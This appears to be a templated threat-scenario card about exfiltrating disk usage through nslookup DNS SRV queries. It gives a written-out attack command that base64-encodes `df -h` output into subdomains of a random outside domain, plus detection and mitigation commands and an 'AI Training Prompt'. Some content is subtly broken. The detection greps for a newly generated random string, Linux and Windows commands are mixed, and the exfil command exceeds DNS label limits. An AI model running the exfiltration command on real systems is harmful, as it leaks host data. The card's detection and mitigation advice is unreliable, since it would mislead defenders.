---
type: campaign
scenario_id: 426
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using nslookup to exfiltrate disk usage via DNS SRV queries.

## Threat Description
Using nslookup to exfiltrate disk usage via DNS SRV queries.

## Attack Command
```
nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(df -h | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor SRV queries: `tshark -Y 'dns.qry.type == 33' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.

## Mitigation
Restrict nslookup: `icacls %windir%\System32\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect nslookup-based DNS exfiltration of disk usage via SRV queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
